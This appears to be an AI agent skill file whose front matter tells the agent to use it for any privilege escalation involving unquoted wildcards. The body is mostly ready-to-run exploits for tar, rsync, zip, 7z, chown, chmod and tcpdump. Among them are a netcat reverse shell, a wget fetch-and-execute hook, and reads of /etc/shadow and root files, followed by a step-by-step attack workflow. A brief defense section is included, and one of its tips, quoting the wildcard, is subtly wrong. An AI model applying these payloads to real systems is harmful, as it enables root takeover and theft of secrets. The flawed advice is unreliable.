---
name: wildcard-injection
description: Privilege escalation via wildcard/glob argument injection. Use this skill whenever you need to exploit unquoted wildcards in privileged scripts, or when analyzing binaries like tar, rsync, zip, 7z, tcpdump, chown, chmod for argument injection vulnerabilities. Trigger this skill for any privilege escalation scenario involving file operations, backup scripts, or sudoers rules with wildcards. Make sure to use this skill when you see patterns like `tar *`, `rsync *`, `zip *`, `chown *`, or any privileged command with unquoted globs.
---

# Wildcard Injection Privilege Escalation

Wildcard (glob) **argument injection** occurs when a privileged script runs a Unix binary with an unquoted wildcard like `*`. Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames beginning with `-` to inject arbitrary flags or commands.

## Prerequisites

1. **Writable directory** that will be processed by a privileged script
2. **Privileged script** using unquoted wildcards (e.g., `tar -czf backup.tgz *`)
3. **Knowledge of the binary** being invoked and its flag syntax

## Attack Patterns by Binary

### tar (GNU tar / Linux / *BSD)

**RCE via checkpoint feature:**

```bash
# Create payload script
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh

# Create trigger files
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

When root runs `tar -czf /root/backup.tgz *`, `shell.sh` executes as root.

**macOS / bsdtar (no checkpoint support):**

```bash
touch "--use-compress-program=/bin/sh"
```

When `tar -cf backup.tar *` runs, `/bin/sh` starts.

### rsync

**Override remote shell:**

```bash
touch "-e sh shell.sh"
```

If root runs `rsync -az * backup:/srv/`, your shell spawns on the remote side.

### zip

**RCE via test hook (-T and -TT):**

Create **separate files** for each token (short options parse per-character):

```
-T
-TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
data.pcap
```

When `zip out.zip <files...>` runs, the wget command executes.

**Notes:**
- Do NOT combine flags in one filename like `'-T -TT <cmd>'`
- Use `-sc` to debug argv parsing
- If slashes are stripped, use bare host/IP with `-O` for local save

### 7-Zip / 7z / 7za

**File exfiltration via @file-list:**

```bash
# Create symlink to target file
ln -s /etc/shadow root.txt

# Create file-list trigger
touch @root.txt
```

When `7za a backup.7z -- *` runs, 7-Zip reads `root.txt` as a file list and prints `/etc/shadow` contents to stderr.

### chown / chmod

**Copy ownership/permissions from arbitrary file:**

```bash
touch "--reference=/root/secretfile"
```

When root runs `chown -R alice:alice *.php` or `chmod -R 644 *.php`, all matching files inherit ownership/permissions of `/root/secretfile`.

### tcpdump

**RCE via rotation hooks (-G/-W/-z):**

```bash
# Create reverse shell script
cat > /tmp/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /tmp/rce.sh

# Inject via file-name parameter
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /tmp/rce.sh"
```

Send a packet matching the filter to trigger rotation and execute the script.

**sudoers misconfiguration exploitation:**

Common anti-pattern:
```
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID> -F/var/cache/captures/filter.<GUID>
```

**Arbitrary write:**
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

**Arbitrary file read (secret leak):**
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

**Root-owned file creation:**
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

### Other Vulnerable Binaries

| Binary | Flag | Effect |
|--------|------|--------|
| `bsdtar` | `--newer-mtime=@<file>` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git` | `-c core.sshCommand=<cmd>` | Command execution via SSH |
| `scp` | `-S <cmd>` | Spawn arbitrary program instead of ssh |

## Detection & Defense

**Detection:**
- Monitor for files starting with `-` in directories processed by privileged scripts
- Check for `--checkpoint`, `--use-compress-program`, `-e`, `-T`, `-TT` in filenames
- Alert on tcpdump with `-z` flag in sudoers rules

**Defense:**
- Always quote wildcards: `tar -czf backup.tgz "*"`
- Use `--` to stop option parsing: `tar -czf backup.tgz -- *`
- Validate and sanitize filenames before passing to binaries
- Restrict sudoers rules to specific arguments, not wildcards
- Use `find` with `-exec` instead of wildcards in scripts

## Workflow

1. **Identify** the privileged script and binary being used
2. **Confirm** you can write files to the target directory
3. **Select** the appropriate attack pattern for the binary
4. **Create** the malicious filename(s)
5. **Trigger** the privileged script execution
6. **Verify** the exploit worked (check for created files, reverse shell, etc.)

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [wildpwn tool](https://github.com/localh0t/wildpwn)
- [DefenseCode wildcard injection paper](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Spare_Trick.pdf)
